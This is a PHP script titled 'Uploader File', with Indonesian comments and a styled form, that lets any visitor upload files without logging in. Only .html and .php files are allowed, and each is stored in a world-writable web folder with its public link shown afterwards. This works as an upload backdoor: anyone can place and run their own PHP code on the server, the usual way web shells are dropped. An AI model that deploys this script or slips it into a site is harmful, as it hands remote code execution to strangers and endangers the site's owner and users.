<?php
// uploader.php

$uploadDir = "uploads/";

// Buat folder uploads otomatis kalau belum ada
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$link = "";
$message = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    if (isset($_FILES['file'])) {

        $fileName = basename($_FILES['file']['name']);
        $fileTmp  = $_FILES['file']['tmp_name'];
        $fileSize = $_FILES['file']['size'];
        $fileExt  = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

        // Format yang diizinkan
        $allowed = ['html', 'php'];

        if (in_array($fileExt, $allowed)) {

            // Nama random biar gak ketimpa
            $newName = time() . "_" . preg_replace("/[^a-zA-Z0-9.\-_]/", "", $fileName);

            $targetFile = $uploadDir . $newName;

            if (move_uploaded_file($fileTmp, $targetFile)) {

                // Auto detect domain
                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
                $domain = $protocol . $_SERVER['HTTP_HOST'];
                $path = dirname($_SERVER['PHP_SELF']);

                $fileUrl = $domain . $path . "/" . $targetFile;

                $message = "✅ File berhasil diupload!";
                $link = $fileUrl;

            } else {
                $message = "❌ Gagal upload file.";
            }

        } else {
            $message = "❌ Hanya file HTML dan PHP yang diperbolehkan.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Uploader File</title>

<style>
body{
    background:#0f0f0f;
    color:white;
    font-family:Arial,sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    margin:0;
}

.box{
    background:#1b1b1b;
    padding:25px;
    border-radius:15px;
    width:90%;
    max-width:420px;
    box-shadow:0 0 15px rgba(0,0,0,.5);
}

h2{
    text-align:center;
    margin-bottom:20px;
}

input[type=file]{
    width:100%;
    padding:10px;
    background:#2b2b2b;
    border:none;
    border-radius:10px;
    color:white;
}

button{
    width:100%;
    margin-top:15px;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#00b894;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:.9;
}

.msg{
    margin-top:15px;
    text-align:center;
}

.link{
    margin-top:10px;
    word-break:break-all;
    background:#2b2b2b;
    padding:10px;
    border-radius:10px;
}

a{
    color:#00cec9;
}
</style>
</head>
<body>

<div class="box">

    <h2>📤 Upload HTML / PHP</h2>

    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">UPLOAD FILE</button>
    </form>

    <?php if($message): ?>
        <div class="msg">
            <p><?= $message ?></p>

            <?php if($link): ?>
                <div class="link">
                    <a href="<?= $link ?>" target="_blank">
                        <?= $link ?>
                    </a>
                </div>
            <?php endif; ?>
        </div>
    <?php endif; ?>

</div>

</body>
</html>